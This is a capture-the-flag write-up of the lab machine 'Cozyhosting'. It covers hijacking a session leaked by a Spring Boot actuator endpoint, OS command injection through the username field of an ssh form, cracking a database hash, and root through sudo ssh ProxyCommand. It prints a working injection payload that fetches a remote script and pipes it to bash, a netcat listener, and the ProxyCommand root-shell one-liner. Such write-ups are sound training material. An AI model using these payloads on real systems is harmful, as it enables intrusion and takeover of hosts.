# Cozyhosting — Easy — Linux

**Date:** 15 - Aug - 2026

---

## Tags

`#linux` `#web` `#spring-boot` `#actuator` `#session-hijack` `#command-injection` `#postgresql` `#hash-cracking` `#sudo` `#ssh-proxycommand` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|10.129.229.88 (host: cozyhosting.htb)|
|OS|Ubuntu Linux|
|Open ports|22, 80|
|Services|OpenSSH 8.9p1 (22); nginx 1.18.0 → Spring Boot app (80)|
|Foothold|Spring Boot `/actuator/sessions` leaks a session cookie → command injection in admin|
|User|`kanderson` (session) → `app` (RCE) → `josh` (DB hash cracked, reused for SSH)|
|Privesc|`josh` may `sudo /usr/bin/ssh *` → abuse `ProxyCommand` → root|
|Flags|user.txt as josh; root.txt as root|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.229.88
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-15 11:06 +0100
Nmap scan report for 10.129.229.88
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds
```

<img width="871" height="315" alt="image" src="https://github.com/user-attachments/assets/f5ba49a5-6eef-4370-96fd-3e96f0094eac" />

```
nmap -sC -sV -p22,80 10.129.229.88
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-15 11:07 +0100
Nmap scan report for 10.129.229.88
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
```

<img width="1213" height="481" alt="image" src="https://github.com/user-attachments/assets/a8738eab-bcf0-4fa4-bbb9-8f0ba8d3fbbd" />

**What each port tells me:**

- **Port 22 (SSH)** — OpenSSH 8.9p1 on Ubuntu. Open, but no credentials yet, a target to return to once I find some.
- **Port 80 (HTTP)** — nginx redirecting to `cozyhosting.htb`; a web application is the entry point, so I'll focus here first.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: I could SSH into the server given valid creds
WHAT I AM GOING TO TRY: Set it aside
WHY: No credentials yet
RESULT: N/A
WHAT NEXT:
- nmap shows a redirect on 80 → add cozyhosting.htb to /etc/hosts and investigate
- Dir-fuzz for hidden directories
- vhost-fuzz for other subdomains
- Identify the tech stack
```

```
OBSERVATION:
- The site is a hosting-company homepage with only a login endpoint
- Nothing notable from dir-fuzz, vhost-fuzz, stack, or source review
- /robots.txt returns a "Whitelabel Error Page"
WHAT IT TELLS ME:
- The error page is the only real lead, worth identifying
WHAT I AM GOING TO TRY:
- Research the Whitelabel Error Page
WHY:
- No other leads at the moment
RESULT:
- The Whitelabel Error Page is characteristic of Spring Boot
- A Spring Boot-targeted dir-fuzz found /actuator (Spring Boot Actuator management endpoints)
- /actuator lists sub-endpoints; the interesting one is /actuator/sessions, which leaked a
  live session ID mapped to user "kanderson"
- I replaced my JSESSIONID cookie with the leaked one and was logged in as K. Anderson,
  reaching the /admin dashboard
WHAT NEXT:
- Explore the authenticated app for a foothold
```

<img width="2393" height="878" alt="image" src="https://github.com/user-attachments/assets/db5f0037-fc89-4f11-836d-889feb46fe71" />

<img width="1062" height="444" alt="image" src="https://github.com/user-attachments/assets/228312a2-0c80-4611-8888-de45d1b4c38e" />

<img width="2130" height="990" alt="image" src="https://github.com/user-attachments/assets/7ba405b2-2feb-498f-b148-fc828f4163ae" />

<img width="1157" height="821" alt="image" src="https://github.com/user-attachments/assets/b474fae9-79bd-4053-a12d-14f62b868dfb" />

<img width="1698" height="489" alt="image" src="https://github.com/user-attachments/assets/3d2846ca-0939-4da1-a460-60ef31e64991" />

<img width="1050" height="952" alt="image" src="https://github.com/user-attachments/assets/3cd2f37c-c4e4-402c-baca-c7ae1441769b" />

<img width="2544" height="1223" alt="image" src="https://github.com/user-attachments/assets/d1485eb4-9b6f-436f-9e41-5403e7ab30fa" />

```
OBSERVATION:
- The dashboard's "Include host into automatic patching" form: submitting dummy values
  (host=test, user=test) returned an SSH error about not resolving the hostname
WHAT IT TELLS ME:
- There's an underlying ssh command built from my input, if unsanitised, it's OS command
  injection
WHAT I AM GOING TO TRY:
- Manipulate the /executessh parameters in Burp to trigger command injection
WHY:
- The error revealed a backend ssh call; unsanitised input into it means arbitrary command
  execution
RESULT: after testing /executessh I worked out:
  1. the host parameter is filtered, no manipulation possible there
  2. the username parameter IS injectable, but the payload must sit between two ';'
     (one before, one after the injection)
  3. to see output I must redirect with >&2, since the app only returns stderr
  4. special characters must be URL-encoded (Content-Type: application/x-www-form-urlencoded)
  5. username rejects whitespace, so I used ${IFS} in place of spaces to build the payload
- With the crafted injection I got a reverse shell as user "app"
- Couldn't read user.txt (owned by josh)
WHAT NEXT:
- Find a way to move laterally to josh
```

<img width="1461" height="595" alt="image" src="https://github.com/user-attachments/assets/703e962c-c49e-45cd-934b-50b666069510" />

<img width="1957" height="569" alt="image" src="https://github.com/user-attachments/assets/1d18b120-f579-4cb5-b532-b2b3b31fceac" />

<img width="2083" height="435" alt="image" src="https://github.com/user-attachments/assets/5a1ac6cb-d614-4ff3-9f33-12af5df7e2d0" />

<img width="924" height="117" alt="image" src="https://github.com/user-attachments/assets/0c8dcf70-5f07-4f76-a264-e7ffb9524e9d" />

<img width="2523" height="714" alt="image" src="https://github.com/user-attachments/assets/3dc5d5ad-0df4-41cc-b665-47cb904d6ba2" />

<img width="1060" height="350" alt="image" src="https://github.com/user-attachments/assets/971cc356-3ee0-48bb-8fb2-548d6cf3b60b" />

<img width="461" height="160" alt="image" src="https://github.com/user-attachments/assets/c7893f36-1efc-4314-9115-d65a4ede4644" />

```
OBSERVATION:
- In /app I found cloudhosting-0.0.1.jar; transferred it to my box and decompiled it
- Inside were hardcoded PostgreSQL credentials
WHAT IT TELLS ME:
- Use the DB creds locally: the app's database likely stores user password hashes I can crack
WHAT I AM GOING TO TRY:
- Log into local PostgreSQL with the JAR creds, and investigate the DB
WHY:
- App databases commonly hold bcrypt password hashes;
RESULT:
- Connected to PostgreSQL, read the users table, and recovered a bcrypt hash for the admin
  account. Cracked it with hashcat (rockyou) → plaintext password
- That password is reused as josh's system password: SSH in as josh and read user.txt
WHAT NEXT:
- Enumerate as josh for a privesc path
```

<img width="1088" height="432" alt="image" src="https://github.com/user-attachments/assets/723d8e8e-30a9-4c92-b0d2-16dfa7b2a0b9" />

<img width="2489" height="438" alt="image" src="https://github.com/user-attachments/assets/93a605b1-b4cc-409f-ba7b-9e5b8a612450" />

<img width="1382" height="433" alt="image" src="https://github.com/user-attachments/assets/c155fe02-5902-4508-9af2-aa12a46f95b6" />

<img width="1158" height="907" alt="image" src="https://github.com/user-attachments/assets/1cb50bb4-f000-4eff-8d97-f8bc01486cae" />

<img width="1256" height="597" alt="image" src="https://github.com/user-attachments/assets/ad1848bd-074e-4fc6-8278-84526d46357f" />

<img width="494" height="86" alt="image" src="https://github.com/user-attachments/assets/2cd17515-c1be-4263-9187-c380de8a468b" />

```
OBSERVATION:
- sudo -l shows josh may run /usr/bin/ssh * as root without a password
WHAT IT TELLS ME:
- GTFOBins covers sudo ssh, the trick is abusing ssh's ProxyCommand to run a root shell
WHAT I AM GOING TO TRY:
- Use sudo ssh with a ProxyCommand payload to spawn a root shell
WHY:
- A permissive sudo entry on ssh is a classic misconfiguration; ProxyCommand executes an
  arbitrary command within the ssh call, and here that runs as root
RESULT:
- Got a root shell and read root.txt
```

<img width="1625" height="182" alt="image" src="https://github.com/user-attachments/assets/2aa35a9d-f3f7-4406-bb2b-e563d285cd80" />

<img width="1322" height="1077" alt="image" src="https://github.com/user-attachments/assets/37abbf03-cbe5-4f31-b2a3-9ce89ede6db8" />

<img width="1009" height="180" alt="image" src="https://github.com/user-attachments/assets/67efdb72-c3a0-4311-b4d1-98aaf7729aa1" />

---

## Foothold

**How I got in:** The site's Whitelabel Error Page revealed a **Spring Boot** app. A Spring Boot-targeted fuzz found **`/actuator`**, and **`/actuator/sessions`** leaked a live session ID for `kanderson`. Swapping my `JSESSIONID` for the leaked value logged me into the `/admin` dashboard. The dashboard's "automatic patching" form built a backend **`ssh`** command from user input; the `username` parameter was injectable, so I crafted an **OS command injection** payload (wrapped in `;`, output via `>&2`, spaces via `${IFS}`, URL-encoded) and caught a reverse shell as **`app`**.

**Command / exploit used:**

```
# leak a valid session and hijack it
curl http://cozyhosting.htb/actuator/sessions          # → JSESSIONID for kanderson
# set that cookie in the browser → /admin dashboard

# command injection via the /executessh username parameter (URL-encoded), e.g.
username=;curl${IFS}http://<LHOST>/shell.sh|bash;      # host=<any valid>
# → reverse shell as app
nc -lnvp <LPORT>
```

**Why it worked:** Spring Boot Actuator endpoints are operational/management interfaces that must be locked down in production; here `/actuator/sessions` was exposed and disclosed a logged-in user's session token, so stealing the cookie granted authenticated admin access with no password. The patching feature then concatenated user input directly into a shell `ssh` invocation without sanitising the `username` field, turning form input into arbitrary command execution as the service user `app`.

---

## Privilege Escalation

**Path taken (app → josh → root):** In `/app`, `cloudhosting-0.0.1.jar` contained **hardcoded PostgreSQL credentials**. Logging into the local database, I dumped the users table and recovered a **bcrypt hash**, which I cracked with hashcat to a plaintext that was reused as **josh**'s SSH password (user.txt). As josh, `sudo -l` showed `/usr/bin/ssh *` runnable as root, which I abused via ssh's **`ProxyCommand`** to spawn a root shell (root.txt).

**Command / exploit used:**

```
# decompile the jar, pull DB creds, query PostgreSQL
psql -h 127.0.0.1 -U postgres -W          # creds from the jar
\c cozyhosting
SELECT * FROM users;                       # → admin bcrypt hash

# crack, then reuse as josh
hashcat -m 3200 hash.txt rockyou.txt       # bcrypt → plaintext
ssh josh@10.129.229.88                     # → user.txt

# privesc: sudo ssh ProxyCommand
sudo ssh -o ProxyCommand='; sh 0<&2 1>&2 ;' x     # → root shell → root.txt
```

**Why it worked:** Hardcoded database credentials in the JAR gave local DB access, and the app stored user passwords as bcrypt hashes, recoverable because the password was weak enough for rockyou, and reused verbatim as josh's system password (credential reuse across app and OS). The privesc is a sudo misconfiguration: allowing `ssh` via sudo is dangerous because ssh's `ProxyCommand` runs an arbitrary command through the shell, and since sudo runs ssh as root, that command executes with root privileges, a documented GTFOBins technique.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Used an exposed Spring Boot `/actuator/sessions` endpoint to hijack an admin session, then exploited OS command injection in the dashboard's ssh form to get a shell as `app`.
2. **Privesc technique in one sentence:** Pulled DB creds from the app JAR, cracked a bcrypt hash from PostgreSQL for josh's reused SSH password, then abused `sudo ssh` via `ProxyCommand` to become root.
